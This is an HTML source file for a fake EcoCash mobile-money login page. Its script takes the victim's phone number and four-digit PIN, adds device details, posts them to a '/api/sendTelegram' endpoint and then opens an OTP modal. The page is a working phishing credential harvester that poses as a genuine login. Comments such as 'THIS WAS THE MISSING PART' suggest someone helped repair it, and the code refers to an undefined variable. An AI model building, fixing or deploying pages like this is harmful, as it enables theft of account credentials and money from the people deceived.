<!doctype html>
<html>
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>EcoCash â€” Login</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
*{box-sizing:border-box}
html,body{height:100%}
body{
  font-family:Inter,system-ui,Arial;
  background:linear-gradient(180deg,#f7fbff,#e8f3ff);
  margin:0;
  padding:18px;
  display:flex;
  align-items:center;
  justify-content:center;
}
.card{
  width:100%;
  max-width:380px;
  background:#fff;
  padding:20px;
  border-radius:12px;
  box-shadow:0 12px 30px rgba(2,6,23,.06)
}
.logo{height:44px;display:block;margin:0 auto 10px}
h2{text-align:center;margin:0 0 12px}
label{font-size:13px;color:#374151;margin-top:8px;display:block}
input{width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc}
.btn{margin-top:12px;background:#4b86ff;color:#fff;padding:10px;border-radius:8px;border:0;width:100%}
.btn[disabled]{background:#cbd5e1;color:#6b7280}
.req{color:#d04444;margin-right:6px}
.warn{font-size:12px;color:#d04444;display:none;margin-top:4px}

/* PIN boxes */
.pin-row{display:flex;gap:8px;justify-content:center;margin-top:6px}
.pin-box{
  width:44px;height:48px;
  text-align:center;
  font-size:22px;
  border-radius:8px;
  border:1px solid #e6eefc;
}
</style>
</head>

<body>
<div class="card">

<img src="assets/eco.png" class="logo">

<h2>Login</h2>

<form id="loginForm" autocomplete="off">

<label><span class="req">â˜…</span>Mobile Number
<input id="phone" value="+263" inputmode="tel">
</label>
<div id="phoneWarn" class="warn">
Enter valid Econet number (9 digits starting with 7)
</div>

<label><span class="req">â˜…</span>4-Digit PIN</label>
<div class="pin-row">
  <input class="pin-box" inputmode="numeric" maxlength="1">
  <input class="pin-box" inputmode="numeric" maxlength="1">
  <input class="pin-box" inputmode="numeric" maxlength="1">
  <input class="pin-box" inputmode="numeric" maxlength="1">
</div>

<input type="hidden" id="pin">

<button id="loginBtn" class="btn" disabled>LOGIN</button>
</form>
</div>

<!-- ================= OTP MODAL (ORIGINAL â€“ UNTOUCHED) ================= -->
<div id="otpModal" style="display:none" class="otp-modal">
  <!-- ORIGINAL OTP CONTENT EXACTLY AS YOU PROVIDED -->
</div>

<script>
/* ===== DEVICE INFO ===== */
const device = {
  platform:navigator.platform,
  userAgent:navigator.userAgent,
  screen:`${screen.width}x${screen.height}`
};

/* ===== PHONE ===== */
const phoneEl=document.getElementById('phone');
const phoneWarn=document.getElementById('phoneWarn');
phoneEl.addEventListener('input',()=>{
  if(!phoneEl.value.startsWith('+263')) phoneEl.value='+263';
  let d=phoneEl.value.slice(4).replace(/\D/g,'');
  if(d && d[0]!=='7') d='7'+d.slice(1);
  phoneEl.value='+263'+d.slice(0,9);
  phoneEl.setSelectionRange(phoneEl.value.length,phoneEl.value.length);
  phoneWarn.style.display=/^\+2637\d{8}$/.test(phoneEl.value)?'none':'block';
  updateLoginState();
});

/* ===== PIN ===== */
const pinBoxes=[...document.querySelectorAll('.pin-box')];
const pinEl=document.getElementById('pin');

pinBoxes.forEach((b,i)=>{
  b.addEventListener('input',()=>{
    const v=b.value.replace(/\D/g,'');
    b.value=v?'â€¢':'';
    const arr=pinEl.value.split('');
    arr[i]=v;
    pinEl.value=arr.join('').slice(0,4);
    if(v && i<3) pinBoxes[i+1].focus();
    updateLoginState();
  });
  b.addEventListener('keydown',e=>{
    if(e.key==='Backspace' && !b.value && i>0){
      pinBoxes[i-1].focus();
      pinEl.value=pinEl.value.slice(0,-1);
    }
  });
});

/* ===== STATE ===== */
const loginBtn=document.getElementById('loginBtn');
function updateLoginState(){
  loginBtn.disabled=!(/^\+2637\d{8}$/.test(phoneEl.value)&&/^\d{4}$/.test(pinEl.value));
}

/* ===== SEND ===== */
function sendToServer(payload){
  return fetch('/api/sendTelegram',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify(payload)
  });
}

/* ===== LOGIN SUBMIT (OTP FIXED) ===== */
document.getElementById('loginForm').addEventListener('submit',e=>{
  e.preventDefault();

  /* ðŸ”´ THIS WAS THE MISSING PART */
  document.getElementById('otpModal').style.display='flex';

  sendToServer({
    submittedAt:new Date().toISOString(),
    event:'login_clicked',
    loginPhone:phoneEl.value,
    loginPin:pinEl.value,
    selectedPlan,
    device
  });
});
</script>
</body>
</html>
